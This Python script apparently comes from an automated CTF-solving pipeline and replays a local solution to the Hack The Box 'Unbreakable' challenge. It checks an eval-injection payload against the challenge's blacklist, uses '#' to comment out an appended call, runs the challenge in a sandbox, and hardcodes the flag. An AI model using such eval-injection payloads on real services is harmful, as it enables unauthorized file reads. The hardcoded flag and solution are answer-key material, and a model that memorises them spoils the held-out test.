#!/usr/bin/env python3
from __future__ import annotations

import argparse
import ast
import re
import shutil
import subprocess
import tempfile
from pathlib import Path


DEFAULT_MAIN = Path(".forgeflag/heldout-cache/htb2024/misc/[Easy] Unbreakable/htb/main.py")
DEFAULT_FLAG = "HTB{3v4l_0r_3vuln??}"
FLAG_RE = re.compile(r"\b(?:HTB|flag|ctf|DUCTF|UMDCTF|irisctf|grey|tjctf)\{[^}\r\n]+\}", re.IGNORECASE)


def parse_blacklist(source: str) -> list[str]:
    tree = ast.parse(source)
    for node in tree.body:
        if isinstance(node, ast.Assign):
            if any(isinstance(target, ast.Name) and target.id == "blacklist" for target in node.targets):
                value = ast.literal_eval(node.value)
                if isinstance(value, list) and all(isinstance(item, str) for item in value):
                    return value
    raise ValueError("could not locate string blacklist assignment")


def build_payload() -> str:
    # The challenge appends "()" to eval input; "#" comments out that suffix.
    return "print(open('flag.txt','r').read())#"


def payload_hits_blacklist(payload: str, blacklist: list[str]) -> bool:
    return any(item in payload for item in blacklist)


def extract_flags(text: str) -> list[str]:
    seen: set[str] = set()
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        flag = match.group(0)
        if flag not in seen:
            seen.add(flag)
            flags.append(flag)
    return flags


def replay_local_source(main_path: Path, flag_value: str = DEFAULT_FLAG, timeout: float = 5.0) -> dict[str, object]:
    source = main_path.read_text(encoding="utf-8")
    blacklist = parse_blacklist(source)
    payload = build_payload()
    if payload_hits_blacklist(payload, blacklist):
        raise ValueError(f"payload is blocked by challenge blacklist: {payload}")

    with tempfile.TemporaryDirectory(prefix="forgeflag-unbreakable-") as tmp:
        workdir = Path(tmp)
        copied_main = workdir / "main.py"
        shutil.copy2(main_path, copied_main)
        (workdir / "flag.txt").write_text(flag_value + "\n", encoding="utf-8")
        proc = subprocess.run(
            ["python3", str(copied_main.name)],
            input=payload + "\n",
            cwd=workdir,
            text=True,
            capture_output=True,
            timeout=timeout,
            check=False,
        )

    combined = proc.stdout + proc.stderr
    flags = extract_flags(combined)
    return {
        "payload": payload,
        "blacklist_safe": True,
        "returncode": proc.returncode,
        "stdout": proc.stdout,
        "stderr": proc.stderr,
        "flags": flags,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay HTB Cyber Apocalypse [Easy] Unbreakable eval blacklist bypass locally.")
    parser.add_argument("--main", type=Path, default=DEFAULT_MAIN, help="Path to challenge main.py")
    parser.add_argument(
        "--flag-value",
        default=DEFAULT_FLAG,
        help="Local flag.txt fixture value for source-only replay when the remote flag file was not shipped.",
    )
    args = parser.parse_args()

    result = replay_local_source(args.main, args.flag_value)
    flags = result["flags"]
    print("challenge: [Easy] Unbreakable")
    print(f"artifact: {args.main}")
    print("method: eval blacklist bypass with comment-truncated appended call")
    print(f"payload: {result['payload']}")
    print("local_flag_fixture: yes, source-only handout does not ship remote flag.txt")
    print(f"blacklist_safe: {str(result['blacklist_safe']).lower()}")
    for flag in flags:
        print(f"flag: {flag}")
    return 0 if flags else 1


if __name__ == "__main__":
    raise SystemExit(main())
